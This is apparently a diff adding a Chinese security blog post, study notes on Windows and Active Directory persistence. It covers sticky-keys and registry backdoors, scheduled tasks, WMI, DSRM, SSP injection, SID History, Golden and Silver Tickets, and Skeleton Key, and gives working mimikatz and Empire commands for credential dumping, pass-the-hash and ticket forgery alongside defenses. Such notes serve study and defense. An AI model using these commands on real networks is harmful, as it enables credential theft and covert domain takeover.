@@ -1,0 +1,1304 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="内网,笔记,权限维持," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="权限维持分析及防御操作系统后门及防范粘滞键后门在Windows主机上连续按5次Shift键，可以调出粘滞键。粘滞键调用的是C:\\Windows\System32中的sethc.exe可执行文件。如果将cmd.exe，改名为sethc.exe，那么按5次Shift将会用System权限调用cmd窗口。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网安全攻防笔记8">
+<meta property="og:url" content="http://example.com/2022/06/01/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%AC%94%E8%AE%B08/index.html">
+<meta property="og:site_name" content="Recoder">
+<meta property="og:description" content="权限维持分析及防御操作系统后门及防范粘滞键后门在Windows主机上连续按5次Shift键，可以调出粘滞键。粘滞键调用的是C:\\Windows\System32中的sethc.exe可执行文件。如果将cmd.exe，改名为sethc.exe，那么按5次Shift将会用System权限调用cmd窗口。">
+<meta property="og:locale">
+<meta property="og:image" content="c:/Users/Home/AppData/Roaming/Typora/typora-user-images/image-20220601103736027.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220606185908.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220606192603.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220606193658.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220606194553.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220606201940.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220607091527.png">
+<meta property="article:published_time" content="2022-06-01T01:46:30.000Z">
+<meta property="article:modified_time" content="2022-06-01T01:46:30.000Z">
+<meta property="article:author" content="Laplace">
+<meta property="article:tag" content="内网">
+<meta property="article:tag" content="笔记">
+<meta property="article:tag" content="权限维持">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="c:/Users/Home/AppData/Roaming/Typora/typora-user-images/image-20220601103736027.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://example.com/2022/06/01/内网安全攻防笔记8/"/>
+
+
+
+
+
+  <title>内网安全攻防笔记8 | Recoder</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Recoder</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/06/01/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%AC%94%E8%AE%B08/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Laplace">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Recoder">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">内网安全攻防笔记8</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2022-06-01T09:46:30+08:00">
+                2022-06-01
+              </time>
+            
+
+			
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" itemprop="url" rel="index">
+                    <span itemprop="name">内网安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="权限维持分析及防御"><a href="#权限维持分析及防御" class="headerlink" title="权限维持分析及防御"></a>权限维持分析及防御</h1><h2 id="操作系统后门及防范"><a href="#操作系统后门及防范" class="headerlink" title="操作系统后门及防范"></a>操作系统后门及防范</h2><h3 id="粘滞键后门"><a href="#粘滞键后门" class="headerlink" title="粘滞键后门"></a>粘滞键后门</h3><p>在Windows主机上连续按5次<code>Shift</code>键，可以调出粘滞键。粘滞键调用的是<code>C:\\Windows\System32</code>中的sethc.exe可执行文件。如果将cmd.exe，改名为<code>sethc.exe</code>，那么按5次<code>Shift</code>将会用System权限调用cmd窗口。</p>
+<span id="more"></span>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Cd windows\system32</span><br><span class="line">Move sethc.exe sethc.exe.bak</span><br><span class="line">copy cmd.exe sethc.exe</span><br></pre></td></tr></table></figure>
+
+<p>在Empire也可以简单实现这个功能。使用<code>lateral_movement/invoke_wmi_debuggerinfo</code>模块</p>
+<p>设置agent , computername , listener。后在目标计算机上按5次<code>Shift</code>。有一个闪过的PowerShell页面。然后Empire显示反弹agent上线</p>
+<p>可以采取一下防御措施:</p>
+<ul>
+<li>登录远程服务器时，按5次<code>Shift</code>，查看是否出现异常</li>
+<li>拒绝使用sethc.exe。或者在控制面板关闭启用<code>启用粘滞键</code></li>
+</ul>
+<h3 id="注册表注入后门"><a href="#注册表注入后门" class="headerlink" title="注册表注入后门"></a>注册表注入后门</h3><p>攻击者可以将需要执行的后门，或者脚本路径写入注册表键:<br><code>HKCU:Software\Microsoft\Windows\CurrentVersion\Run</code>中。</p>
+<p>使用Empire的 <code>persistence/userland/registry</code>模块，也可以实现该功能</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set Listener</span><br><span class="line">set RegPath HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\Run</span><br></pre></td></tr></table></figure>
+
+<p>当管理员登录系统时，后门可以运行。</p>
+<p>杀毒软件对于此类后门有专门的查杀机制，如果发现提示框，对应删除即可。</p>
+<h3 id="计划任务后门"><a href="#计划任务后门" class="headerlink" title="计划任务后门"></a>计划任务后门</h3><p>计划任务后门的基本命令如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /tn Updater /tr notepad.exe /sc hourly /mo 1</span><br></pre></td></tr></table></figure>
+<p>表示每个小时启动一次notepad.exe</p>
+<ol>
+<li>Metsaploit</li>
+</ol>
+<p>使用 exploit/multi/script/web_delivery模块</p>
+<ol start="2">
+<li>PowerSploit</li>
+</ol>
+<p>使用 Persistence.psm1模块</p>
+<ol start="3">
+<li>Empire</li>
+</ol>
+<p>使用 persistence/elevated/schtasks模块</p>
+<h2 id="WMI后门"><a href="#WMI后门" class="headerlink" title="WMI后门"></a>WMI后门</h2><p>WMI型后门只能由具有管理员权限的用户执行。</p>
+<p>WMI型后门主要使用WMI的两个特性:无文件，无进程。它的原理:将代码加密存放在WMI中，及”无文件”；当设定条件满足，系统自动启动PowerShell执行后门程序，执行后，进程消失（一般是几秒种）,达到无进程</p>
+<p>在Empire使用 persistence/elevated/wmi模块</p>
+<p>查看目标主机，发现WMI后门已经存在主机中。<br><code>Get-WmiObject -Namespace root\Subscription -Class CommandLineEventConsumer</code></p>
+<p><img src="C:\Users\Home\AppData\Roaming\Typora\typora-user-images\image-20220601103736027.png" alt="image-20220601103736027"></p>
+<p>重启计算机后，Empire可以看到agent上线</p>
+<h2 id="WebShell后门"><a href="#WebShell后门" class="headerlink" title="WebShell后门"></a>WebShell后门</h2><h3 id="php后门"><a href="#php后门" class="headerlink" title="php后门"></a>php后门</h3><p>weevely php后门<br>webacoo php 后门</p>
+<h2 id="DC权限持久化分析"><a href="#DC权限持久化分析" class="headerlink" title="DC权限持久化分析"></a>DC权限持久化分析</h2><p>在获得DC的权限后，通常会想办法对于现有权限持久化。</p>
+<h3 id="DSRM域后门"><a href="#DSRM域后门" class="headerlink" title="DSRM域后门"></a>DSRM域后门</h3><p>1.DSRM后门简介</p>
+<p>DSRM(Directory Service Restore Mode , 目录恢复模式)是域环境中的DC的安全模式启动项。每一个DC都有一个DSRM帐号。DSRM可以在域环境崩溃的时候还原AD，是域环境恢复正常。在域创建的时候,DSRM的密码会在安装DC的时候设置。可以在DC上使用ntdsutil命令行修改DSRM密码。</p>
+<p>在渗透测试中，可以使用DSRM帐号对域环境进行持久化工作。如果DC为Win2008，需要安装KB961320才可以使用指定帐号密码对DSRM密码进行同步。在Win2008以后的版本不需要安装此补丁。如果环境为Win2003，不能使用该方法进行持久化。</p>
+<p>每个DC有本地管理员帐号密码。（与域管理员帐号密码不同）。DSRM帐号可以作为一个DC的本地管理员账户，可以通过网络连接域控制器，进而控制域控制器。</p>
+<p>2.修改DSRM密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">NTDSUTIL //打开ntdsutil</span><br><span class="line">set dsrm password</span><br><span class="line">reset password on server null //在当前DC上恢复DSRM密码</span><br><span class="line">&lt;PASSWORD&gt;   //修改后的密码</span><br><span class="line">q            //退出DSRM密码设置</span><br><span class="line">q            //退出 ntdsutil</span><br></pre></td></tr></table></figure>
+
+<p>如果环境为win2008 (已安装KB961320)及以上，可以将DSRM密码同步为已经存在的域帐号密码。常用命令:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil   //打开ntdsutil</span><br><span class="line">set dsrm PASSWORD //设置DSRM密码</span><br><span class="line">SYNC FROM DOMAIN ACCOUNT domainusername   //使得DSRM密码和指定域用户的密码同步</span><br><span class="line">q     //退出DSRM密码设置模式</span><br><span class="line">q     // 退出 ntdsutil</span><br></pre></td></tr></table></figure>
+
+
+<p>3.实验操作</p>
+<p>(1) 使用mimikatz查看krbtgt的NTLM Hash</p>
+<p>在域控制器中打开mimikatz ，查看krbtgt NTLM Hash <code>d6f45add3d6ca516637d5c6862b0fb32</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">lsadump::lsa /patch /name:krbtgt</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220606185908.png"></p>
+<p>(3) 将DSRM帐号和brbtgt的NTLM Hash同步</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil   //打开ntdsutil</span><br><span class="line">set dsrm PASSWORD //设置DSRM密码</span><br><span class="line">SYNC FROM DOMAIN ACCOUNT krbtgt   //使得DSRM密码和指定域用户的密码同</span><br></pre></td></tr></table></figure>
+<p>如果出现显示密码过期，需要修改krbtgt密码<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220606192603.png"></p>
+<p>(4)查看DSRM帐号的 NTLM Hash是否同步</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::sam</span><br></pre></td></tr></table></figure>
+
+<p>(5)修改DSRM的登录方式</p>
+<p>在注册表新建 HKLM\SYstem\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior  值</p>
+<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220606193658.png"></p>
+<p>DSRM有三种登录方式</p>
+<ul>
+<li>0: 默认，当DC重启并进入DSRM模式时，可以使用DSRM管理员账户</li>
+<li>1: 当本地AD , DS服务停止时，可以使用DSRM管理员帐号登录DC</li>
+<li>2: 在任何情况下，可以使用DSRM管理员登录帐号</li>
+</ul>
+<p>(6)使用DSRM帐号通过远程网络登录DC</p>
+<p>使用mimikatz进行Hash传递</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth /domain:DC /user:Administrator /ntlm:d6f45add3d6ca516637d5c6862b0fb32</span><br></pre></td></tr></table></figure>
+
+<p>(7)使用mimikatz的dcysnc功能远程转存krbtgt的NTLM Hash</p>
+<p>在(6)之后会打开一个命令行窗口。在该窗口中打开mimikatz，输入命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /domain:pentest.com /dc:dc /user:krbtgt</span><br></pre></td></tr></table></figure>
+
+
+<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220606194553.png"></p>
+<p>4.DSRM后门防御</p>
+<ul>
+<li>检查注册表中  HKLM\SYstem\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior  值为1 或者删除</li>
+<li>定期修改DSRM帐号</li>
+<li>检查ID 为 4794的日志。该日志记录设置DSRM密码</li>
+</ul>
+<h3 id="SSP维持域权限"><a href="#SSP维持域权限" class="headerlink" title="SSP维持域权限"></a>SSP维持域权限</h3><p>SSP(Security Support Provider)是Windows操作系统安全机制的提供者。简单来说SSP是一个DLL文件，用来实现Windows操作系统的身份认证，如NTLM 、Kerboeros</p>
+<p>SSPI(Security Suport Provider Interface， 安全支持提供程序接口)是Windows操作系统在执行认证操作时使用的API接口。  SSPI是 SSP的API接口</p>
+<p>如果获得了目标机器的System权限，可以使用该方法进行持久化。原理: LSA(Local Security Authority)用于身份认证;lsass.exe作为Window的系统进程，用于本地安全和登录策略。在系统启动的时候,SSP被加载到lsass.exe中。如果攻击者对LSA进行了扩展，自定义的DLL文件，在系统启动时将它加载到lsass.exe中可以获得lsass.exe中的明文密码。这样，即使用户更改密码，并且重新登录，攻击者仍然可以获得该帐号的新密码。</p>
+<h4 id="使用mimikatz进行SSP注入"><a href="#使用mimikatz进行SSP注入" class="headerlink" title="使用mimikatz进行SSP注入"></a>使用mimikatz进行SSP注入</h4><p>使用mimikatz不会在系统中留下二进制文件，但是如果DC重启，伪造SSP会丢失。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">misc::memssp</span><br></pre></td></tr></table></figure>
+
+<p>注销用户后重新登录，密码记录在<code>C:\Windows\System32\mimilsa.log</code>中<br>这种方法在DC重启后会失效</p>
+<h4 id="将mimilib-dll添加到注册表"><a href="#将mimilib-dll添加到注册表" class="headerlink" title="将mimilib.dll添加到注册表"></a>将mimilib.dll添加到注册表</h4><p>将mimikatz中的 mimilib.dll放到 系统的 <code>C:\windows\system32\</code>下，并将mimilib.dll添加到注册表中。</p>
+<p>首先将mimilib.dll文件复制到<code>C:\windows\system32\</code>中。</p>
+<p>修改 <code>HKLM/System/CurrentControlSet/Control/Lsa/Security Packages</code>项加载新的DLL文件</p>
+<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220606201940.png"></p>
+<p>系统重启后，如果DLL被成功加载，用户登录时输入的帐号密码会记录在 <code>C:\windows\system32\kiwissp.log</code>中</p>
+<h4 id="SSP防范"><a href="#SSP防范" class="headerlink" title="SSP防范"></a>SSP防范</h4><ul>
+<li>检查<code>HKLM/System/CurrentControlSet/Control/Lsa/Security Packages</code>注册表是否有可疑DLL</li>
+<li><code>C:\Windows\System32</code>是否有可疑DLL文件</li>
+<li>使用第三方工具检查LSA中是否有可疑DLL文件</li>
+</ul>
+<h3 id="SID-History-域后门"><a href="#SID-History-域后门" class="headerlink" title="SID History 域后门"></a>SID History 域后门</h3><p>每个用户有自己的SID. SID是跟踪用户的访问权限。SID History实在域迁移的过程中需要使用的一个属性</p>
+<p>如果将A域的用户迁移的B域中，那么在B域中的新建立的A域用户的SID就会改变，进而影响迁移后用户的权限。SID History的作用是在域迁移的过程中保持域用户的权限，如果迁移后用户的SID改变，系统会将原来的SID添加到迁移后的用户的SID History属性中，使得迁移后的用户可以保持原有的权限。</p>
+<p>使用mimikatz可以将SID History属性添加到域内任意用户的SID History中。如果获得了DC权限，可以将SID History作为实现持久化的方法</p>
+<h4 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h4><p>查看用户的SID History</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module ActiveDirectory</span><br><span class="line">Get-ADUser win2008 -Properties  sidhistory</span><br></pre></td></tr></table></figure>
+<p>使用mimikatz将Administrator的 SID添加到普通用户的SID History属性</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sid::patch</span><br><span class="line">sid::add /sam:win2008 /new:administrator</span><br></pre></td></tr></table></figure>
+
+<h4 id="SID-History后门防御"><a href="#SID-History后门防御" class="headerlink" title="SID History后门防御"></a>SID History后门防御</h4><p>SID History后门特点:</p>
+<ul>
+<li>控制DC后，可以通过出入SID Historyr属性完成持久化任务</li>
+<li>拥有高权限SID用户，可以使用PowerShell远程导出DC ntds.dit</li>
+<li>可以在mimikatz中执行<code>sid::clear /sam:username</code> 清除SID History属性</li>
+</ul>
+<p>SID History后门防御:</p>
+<ul>
+<li>查看域中SID为500的用户</li>
+<li>完成域迁移后，对有相同的SID History属性用户进行检查</li>
+<li>检查4765 和 4766日志。 4765是SID History属性添加到用户的日志，4766是SID History属性添加到用户失败的日志</li>
+</ul>
+<h3 id="Golden-Ticket"><a href="#Golden-Ticket" class="headerlink" title="Golden Ticket"></a>Golden Ticket</h3><p>在域环境中，如果获得了krbtgt的NTLM Hash或则 AES-256，可以伪造域内任意用户的身份，并使用该用户身份访问其他服务。</p>
+<p>使用Golden Ticket进行PTT需要一下信息:</p>
+<ul>
+<li>伪造的域管理员用户名</li>
+<li>完整的域名</li>
+<li>域SID</li>
+<li>krbtgt的NTLM 或者 AES-256</li>
+</ul>
+<p>(1)导出krbtgt的 NTLM Hash</p>
+<p>在mimikatz</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /domain:pentset.com /user:krbtgt</span><br></pre></td></tr></table></figure>
+
+<p>使用mimikatz的dcsync远程导出AD中的ntds.dit。指定 /user参数 只导出krbtgt帐号信息。</p>
+<p>(2)获得基本信息</p>
+<p>获得域SID<br><code>wmic useraccount get name , sid</code></p>
+<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220607091527.png"><br>用户SID,除了最后一段为域SID</p>
+<p>(3)查询域管理员帐号</p>
+<p><code>net group &quot;domain admins&quot; /domain</code></p>
+<p>(4) 查询域名<br><code>ipconfig /all</code></p>
+<h4 id="实验操作"><a href="#实验操作" class="headerlink" title="实验操作"></a>实验操作</h4><p>(1)清空票据</p>
+<p>在mimikatz中<code>kerberos::purge</code></p>
+<p>(2)生成票据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /admin:administrator /domain:hacke.testlab /sid:S-1-5-21-2922091672-2198656461-2394181596  /krbtgt:d6f45add3d6ca516637d5c6862b0fb32 /ticket:Administrator.kiribi</span><br></pre></td></tr></table></figure>
+<p>生成成功后，在当前目录下生成一个<code>Administrator.kiribi</code>的文件<br>(3)转递票据并注入内存</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt Administrator.kiribi</span><br></pre></td></tr></table></figure>
+
+
+<p>(4)验证权限</p>
+<p>退出后通过命令<code>dir \\dc\c$</code>列出文件</p>
+<p>使用wmiexec.vbs进行验证<br><code>cscript wmiexec.vbs /shell dc</code></p>
+<p>同样使用AES-256也可以生成票据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /admin:administrator /domain:hacke.testlab /sid:S-1-5-21-2922091672-2198656461-2394181596  /aes256:d6f45add3d6ca516637d5c6862b0fb32 /ticket:Administrator.kiribi</span><br></pre></td></tr></table></figure>
+
+<h4 id="Golden-Ticket防御措施"><a href="#Golden-Ticket防御措施" class="headerlink" title="Golden Ticket防御措施"></a>Golden Ticket防御措施</h4><p>修改krbtgt密码重置两次</p>
+<h3 id="Silver-Ticket"><a href="#Silver-Ticket" class="headerlink" title="Silver Ticket"></a>Silver Ticket</h3><p>Silver Ticket(白银票据)与黄金票据不同。白银票据伪造TGS,通过已知的授权服务密码生成一张可以访问该服务的TGT。在票据生成过程中不需要使用KDC，可以绕过DC，很少留下日志。</p>
+<p>Silver Ticket依赖与服务帐号密码散列值更加隐蔽。</p>
+<p>白银票据通过对应的服务帐号伪造TGS，如LDAP , MSSQL, WinRM, DNS, CIFS等。范围有限，只能获得对应的服务权限。</p>
+<p>使用白银票据需要掌握一下信息:</p>
+<ul>
+<li>域名</li>
+<li>域SID</li>
+<li>目标服务器FQDN</li>
+<li>可利用的服务</li>
+<li>服务帐号NTLM Hash</li>
+<li>需要伪造的用户名</li>
+</ul>
+<h4 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h4><p>使用mimikatz获得DC上计算机帐号DC$的NTLM Hash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
+
+<p>在命令行中清空票据<br><code>klist purge</code></p>
+<p>生成白银票据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:hacke.tsetlab /sid:&#123;域ID&#125; /target:dc.hacke.testlab /service:ldap /rc4:&#123;NTLM Hash&#125; /user:dc /ptt</span><br></pre></td></tr></table></figure>
+
+<p>通过dcsync从DC获得krbtgt密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /dc:dc.hacke.testlab /domain:hacke.testlab /user:krbtgt</span><br></pre></td></tr></table></figure>
+
+<p>白银票据还可以伪造其他服务，如计划任务，WMI，POWERSHELL等</p>
+<h4 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h4><ul>
+<li>安装杀毒软件，更新系统补丁</li>
+<li>限制mimikatz在网络上使用</li>
+<li>计算机帐号密码默认30天修改</li>
+</ul>
+<h3 id="Skeleton-Key"><a href="#Skeleton-Key" class="headerlink" title="Skeleton Key"></a>Skeleton Key</h3><p>使用Skeleton Key(万能密码)，可以对域内权限完成持久化</p>
+<h4 id="使用mimikatz"><a href="#使用mimikatz" class="headerlink" title="使用mimikatz"></a>使用mimikatz</h4><p>在DC上打开mimikatz使用命令，将Skeleton Key注入到lsass.exe进程中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">misc::skeleton</span><br></pre></td></tr></table></figure>
+
+<p>这是会在域内所有用户帐号中添加一个Skeleton Key,默认密码为<code>mimikatz</code>。接着可以使用域内任意用户身份，配合Skeleton Key进行域内身份验证。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\dc\ipc$ &quot;mimikatz&quot; /user:hacke\administrator</span><br></pre></td></tr></table></figure>
+
+
+<h4 id="使用Empire"><a href="#使用Empire" class="headerlink" title="使用Empire"></a>使用Empire</h4><p>获得Agent后使用命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">interact xxxx</span><br><span class="line">usemodule persistence/misc/skeleton_key</span><br><span class="line">execute</span><br></pre></td></tr></table></figure>
+
+<p>该模块通过PowerSploi的<code>Invoke-Mimikatz.ps1</code>脚本，加载mimikatz后，使用PowerShell版的mimikatz中的<code>misc::skeleton</code>命令，将Skeleton Key注入lsass.exe进程。</p>
